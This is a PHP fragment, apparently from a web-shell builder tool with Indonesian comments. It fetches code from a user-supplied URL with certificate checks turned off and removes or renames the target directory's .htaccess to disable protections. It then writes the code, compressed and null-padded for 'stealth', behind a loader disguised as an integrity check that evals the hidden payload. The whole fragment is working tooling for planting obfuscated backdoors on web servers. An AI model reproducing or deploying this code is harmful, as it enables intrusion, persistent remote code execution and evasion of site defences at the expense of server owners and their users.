// --- DOWNLOADER FUNCTION ---
function getSource($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $res = curl_exec($ch);
        curl_close($ch);
        if($res) return $res;
    }
    return @file_get_contents($url);
}

// --- BUILDER LOGIC ---
if (isset($_POST['build'])) {
    $url        = trim($_POST['url']);
    
    // Ambil input terpisah
    $dir_input  = rtrim(trim($_POST['dir_path']), '/\\'); // Hapus slash di akhir jika ada
    $file_input = trim($_POST['filename']);
    
    // Gabungkan menjadi path lengkap
    $path       = $dir_input . DIRECTORY_SEPARATOR . $file_input;
    
    $pad_kb     = intval($_POST['padding']); 
    $bypass     = isset($_POST['bypass_htaccess']) ? true : false;

    if ($url && $dir_input && $file_input) {
        // Prepare Directory
        if (!is_dir($dir_input)) { @mkdir($dir_input, 0755, true); }

        // --- BYPASS LOGIC (.htaccess killer) ---
        // Kita gunakan $dir_input langsung
        $htaccess = $dir_input . DIRECTORY_SEPARATOR . ".htaccess";
        $htaccess_bak = $dir_input . DIRECTORY_SEPARATOR . ".htaccess.bak";
        $htaccess_touched = false;

        if ($bypass && file_exists($htaccess)) {
            if (@rename($htaccess, $htaccess_bak)) {
                $htaccess_touched = true;
            } else {
                @chmod($htaccess, 0666);
                @unlink($htaccess); 
            }
        }

        // Download Source
        $code = getSource($url);

        if ($code) {
            // 1. Raw Compression
            $payload = gzdeflate($code, 9);
            
            // 2. Add Weight
            if ($pad_kb > 0) {
                $payload .= str_repeat("\0", $pad_kb * 1024); 
            }

            // 3. Script Header
            $loader = '<?php
// MODULE INTEGRITY: OK
$h = fopen(__FILE__, "rb");
fseek($h, __COMPILER_HALT_OFFSET__);
eval("?>".gzinflate(stream_get_contents($h)));
__halt_compiler();';

            $final = $loader . $payload;

            // Tulis file ke Path Gabungan
            if (@file_put_contents($path, $final)) {
                $size = number_format(filesize($path)/1024, 2);
                
                // Smart Path Display
                $doc_root = $_SERVER['DOCUMENT_ROOT'];
                $web_link = str_replace($doc_root, "", $path);
                
                // Fallback visual jika path diluar root
                $display_loc = ($web_link == $path) ? basename($path) : $web_link;

                $bypass_status = $htaccess_touched ? "<br><span style='color:#facc15; font-size:0.8em;'>(Firewall/Htaccess Disabled)</span>" : "";

                $msg = "<h5>SYSTEM STATUS: SUCCESS</h5>
                        <div class='info-grid'>
                            <span>Target:</span> <code>$display_loc</code>
                            <span>Size:</span> <code>$size KB (Stealth)</code>
                        </div>
                        <a href='$web_link' target='_blank' class='btn-link'>[ OPEN GENERATED FILE ]</a>
                        $bypass_status";
                $msg_class = "success";
            } else {
                $msg = "Write failed! Permission Denied.<br>Try checking the 'Force Mode' box.";
                $msg_class = "error";
            }
        } else {
            $msg = "Download failed. Check URL or Server Connection.";
            $msg_class = "error";
        }
    } else {
        $msg = "Input missing. Please check all fields.";
        $msg_class = "error";
    }
}

// Default values
